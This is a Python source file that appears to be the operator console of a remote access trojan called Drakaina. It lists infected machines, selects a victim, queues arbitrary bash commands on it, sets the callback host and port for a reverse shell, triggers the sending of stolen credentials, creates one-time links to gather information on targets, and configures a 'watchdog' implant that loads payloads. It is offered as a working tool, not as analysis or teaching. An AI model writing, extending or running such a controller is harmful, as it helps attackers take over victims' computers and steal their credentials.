import os
import subprocess
import re
import requests
import apext_db

### TO DO:
### THREADED FUNCTION LOOK FOR NEW USERS IN REALTIME AND UPDATE TO HUDS

### READ SERVER_CONFIG.CFG TO GET IP AND PORT ###
with open("./server.cfg", "r") as cfg:
    ip = '{0}'.format(cfg.readline()[7:].strip())
    port = '{0}'.format(cfg.readline()[5:].strip())

print("""  _____            _         _             
 |  __ \          | |       (_)            
 | |  | |_ __ __ _| | ____ _ _ _ __   __ _ 
 | |  | | '__/ _` | |/ / _` | | '_ \ / _` |
 | |__| | | | (_| |   < (_| | | | | | (_| |
 |_____/|_|  \__,_|_|\_\__,_|_|_| |_|\__,_|
                                           
                                           """)

print(''' please type in a command \n
/list --list all registered users
/target --target a registered user
/create_link --create a token generated 1 time use dynamic link to gather information on a target.\n
/configure_watchdog -- change master server for watchdog before compiling it.
''')

while 1:
    try:
        MAIN_INPUT = input()
        if MAIN_INPUT == '/list':
            RATLIST = []
            for rat in apext_db.get_rat_list():
                RATLIST.append(rat)
                print(rat)
            i2 = 1
            i = 0
            for rat in RATLIST:
                if i2 == 0:
                    i2 = 0
                    print("({0}) {1} ------ username: {2}".format(i-1, RATLIST[i-1], rat))
                else:
                    i2 +=1
                i+=1
    except Exception as e:
        print(e)
        pass
    
    if MAIN_INPUT == '/target':
        print('What rat ip would you like to use?')
        RAT_IP = input()
        print('What username for the ip would you like to use?')
        RAT_IP_USER = input()
        print(apext_db.check_rat_exists(RAT_IP, RAT_IP_USER)[0])
        if apext_db.check_rat_exists(RAT_IP, RAT_IP_USER)[0] == RAT_IP and apext_db.check_rat_exists(RAT_IP, RAT_IP_USER)[1] == RAT_IP_USER:
            username = apext_db.check_rat_existss(RAT_IP)[1]
            print(''' Rat {0} exist choose a command 
/command  #runs a bash command 
/rshell   #attempts a reverse shell
/rshell_show # shows whats server the targets reverse shell wants to connect too.
/reboot    #attempts to send all creds if havent already'''.format(RAT_IP))
            while 1:
                print('---------Enter command')
                command = input()
                if command == '/command':
                    print('please enter the terminal command, no return code or response will be seen.')
                    TERM_CMD = input()
                    apext_db.user_command(RAT_IP, username, TERM_CMD)

                if command == "/rshell_show":
                    print(apext_db.get_rshell_master(RAT_IP, username))
                    print(apext_db.get_rshell_master_port(RAT_IP, username))

                elif command == '/rshell':
                    print('enter ip you want rat ip to connect to port used will be 1337')
                    master_ip = input()
                    print("enter the port.")
                    master_port = input()
                    apext_db.rshell_master(RAT_IP, username, master_ip)
                    apext_db.update_rshell_master_port(RAT_IP, username, master_port)
                    print('changing masterp ip for this rat')

                elif command == '/help':
                    print('''

/command  #runs a bash command 
/rshell   #attempts a reverse shell
/reboot    #attempts to send all creds if havent already
/script
/help''')

    if MAIN_INPUT.lower() == '/create_link':
        n = os.urandom(8).hex()
        f = open('tokens', 'a')
        f.write('{0}\n'.format(n))
        f.close()
        print("Dynamic Token Link created : " + "http://{0}:{1}/inf/{2}".format(ip, port, n))

    if MAIN_INPUT.lower() == '/configure_watchdog':
        print(""" what would you like to change in watchdog \n
        1) master server ip \n
        2) master server port \n
        3) load payload from memory \n
        4) load payload from disk \n
        5) command check delay in seconds \n
        6) reverse shell check delay in seconds 
        """)
                    
        
